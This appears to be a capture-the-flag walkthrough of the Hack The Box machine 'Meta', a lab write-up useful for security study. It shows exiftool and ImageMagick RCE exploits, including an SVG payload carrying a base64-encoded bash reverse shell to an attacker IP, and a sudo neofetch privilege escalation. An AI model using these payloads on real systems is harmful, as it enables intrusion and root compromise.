# Meta

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.204.20
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 14:51 EDT
Nmap scan report for 10.129.204.20
Host is up (0.0076s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `artcorp.htb` to our `/etc/hosts` file to view port 80.

### ArtCorp -> Subdomain Fuzzing

The webpage was a start-up website:

<figure><img src="../../../.gitbook/assets/image (3259).png" alt=""><figcaption></figcaption></figure>

They had a team with some names I might need to use, along with a hint that this was a PHP based website.

<figure><img src="../../../.gitbook/assets/image (3492).png" alt=""><figcaption></figcaption></figure>

There wasn't much on the website, so we can try `gobuster` scanning for directories and `wfuzz` scanning for sub-domains. A `gobuster` scan reveals nothing, but the `wfuzz` scan did reveal one sub-domain.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.artcorp.htb' --hw=0 -u http://artcorp.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://artcorp.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000004177:   200        9 L      24 W       247 Ch      "dev01"
```

Here's the webpage:

<figure><img src="../../../.gitbook/assets/image (1495).png" alt=""><figcaption></figcaption></figure>

### Metadata RCE

The application allows us to upload images to the machine.

<figure><img src="../../../.gitbook/assets/image (3411).png" alt=""><figcaption></figcaption></figure>

Wneh an image is uploaded, the metadata of the image is printed on screen below:

<figure><img src="../../../.gitbook/assets/image (3313).png" alt=""><figcaption></figcaption></figure>

This was the output of `exiftool`, which has some RCE attacks possible through metadata.&#x20;

{% embed url="https://github.com/OneSecCyber/JPEG_RCE" %}

By following the PoC, I was able to confirm that we had RCE on the machine:

```bash
exiftool -config eval.config runme.jpg -eval='system("ls -la")' 
# upload runme.jpg
```

<figure><img src="../../../.gitbook/assets/image (2124).png" alt=""><figcaption></figcaption></figure>

For some reason, the above PoC doesn't let me execute reverse shells. So I changed the script used to this:

{% embed url="https://github.com/convisolabs/CVE-2021-22204-exiftool" %}

After changing the `exploit.py` file to have the correct port and IP address, I got a reverse shell.

<figure><img src="../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We cannot grab the user flag yet.&#x20;

### Morgify

There wasn't much on the machine that `www-data` could access. So I downloaded `pspy64` onto the machone to view processes executed by `root` and the user `thomas`.

There was a script run by the user:

```
2023/05/07 09:37:01 CMD: UID=1000 PID=1335   | /usr/sbin/CRON -f 
2023/05/07 09:37:01 CMD: UID=1000 PID=1336   | /bin/bash /usr/local/bin/convert_images.sh 
2023/05/07 09:37:01 CMD: UID=1000 PID=1338   | /bin/bash /usr/local/bin/convert_images.sh 
2023/05/07 09:37:01 CMD: UID=0    PID=1337   | /usr/sbin/CRON -f 
2023/05/07 09:37:01 CMD: UID=0    PID=1339   | /bin/sh -c rm /tmp/* 
2023/05/07 09:37:01 CMD: UID=1000 PID=1340   | pkill mogrify
```

Here's the script:

{% code overflow="wrap" %}
```bash
www-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```
{% endcode %}

`mogrify` was used, and it is an image editor that is part of ImageMagick. We can first find the version of ImageMagick used here:

```
www-data@meta:/tmp$ mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```

Interesting. There are some RCE exploits pertaining to this:

{% embed url="https://www.cybersecurity-help.cz/vdb/SB2020121303" %}

{% embed url="https://github.com/coco0x0a/CVE-2020-29599" %}

How the exploit works is thorugh embedding XML code within an SVG file. Here's the SVG file I used:

```markup
<image authenticate='ff" `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:exploit.svg" height="100" width="100"/>
  </svg>
</image>
```

This uses a base64 encoded `bash` one-liner reverse shell. After waiting for a little bit, we should get a shell as `thomas`.&#x20;

<figure><img src="../../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

### Neofetch

When we check `sudo` privileges, we see the following:

```
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

GTFOBins does have a command for this binary, but it doesn't work:

```bash
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF
```

Then, I noticed the `XDG_CONFIG_HOME` environment variable. The exploit above relies on changing the configuration files for `neofetch`. In this case, since we cannot specify any flags, we can just create a malicious configuration file that would give us a root shell.

<figure><img src="../../../.gitbook/assets/image (3563).png" alt=""><figcaption></figcaption></figure>
